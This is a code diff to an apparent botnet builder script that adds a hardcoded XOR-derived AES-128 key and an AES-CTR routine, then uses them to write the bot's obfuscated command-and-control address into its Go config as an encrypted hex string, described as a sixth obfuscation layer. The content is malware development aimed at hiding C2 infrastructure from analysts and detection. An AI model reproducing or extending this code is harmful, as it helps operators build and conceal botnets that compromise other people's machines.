@@ -210,6 +210,41 @@ def derive_key_py(seed: str) -> bytes:
     return h.digest()
 
 
+def garuda_key() -> bytes:
+    """Return the raw 16-byte AES key used by garuda() in opsec.go.
+    This is the XOR byte array BEFORE any MD5 derivation."""
+    return bytes([
+        0xCC ^ 0xA6,  # mew()
+        0xC3 ^ 0x91,  # mewtwo()
+        0x79 ^ 0xC0,  # celebi()
+        0x4F ^ 0xAA,  # jirachi()
+        0x51 ^ 0x80,  # shaymin()
+        0x75 ^ 0xD1,  # phione()
+        0x4B ^ 0x7C,  # manaphy()
+        0x87 ^ 0x86,  # victini()
+        0xFC ^ 0x7C,  # keldeo()
+        0xD2 ^ 0x54,  # meloetta()
+        0xE9 ^ 0xEC,  # genesect()
+        0x77 ^ 0xF1,  # diancie()
+        0x3B ^ 0x4C,  # hoopa()
+        0x3C ^ 0x9D,  # volcanion()
+        0x6C ^ 0x3C,  # magearna()
+        0x97 ^ 0x33,  # marshadow()
+    ])
+
+
+def aes_ctr_encrypt(plaintext: str) -> str:
+    """AES-128-CTR encrypt a string using the garuda key.
+    Returns hex string of IV || ciphertext (same format as tools/crypto.go)."""
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    key = garuda_key()
+    iv = os.urandom(16)
+    cipher = Cipher(algorithms.AES(key), modes.CTR(iv))
+    encryptor = cipher.encryptor()
+    ct = encryptor.update(plaintext.encode()) + encryptor.finalize()
+    return (iv + ct).hex()
+
+
 def rc4_encrypt(data: bytes, key: bytes) -> bytes:
     """RC4-like stream cipher (same as Go streamDecrypt)"""
     # Initialize S-box
@@ -398,10 +433,11 @@ def update_bot_main_go(
     with open(config_go_path, "r") as f:
         content = f.read()
 
-    # Update gothTits (obfuscated C2)
+    # Update encGothTits (AES-encrypted obfuscated C2 — 6th layer)
+    enc_goth_tits = aes_ctr_encrypt(obfuscated_c2)
     content = re.sub(
-        r'const gothTits\s*=\s*"[^"]*"',
-        lambda m: f'const gothTits = "{obfuscated_c2}"',
+        r'var encGothTits, _ = hex\.DecodeString\("[^"]*"\)',
+        lambda m: f'var encGothTits, _ = hex.DecodeString("{enc_goth_tits}")',
         content,
     )
 
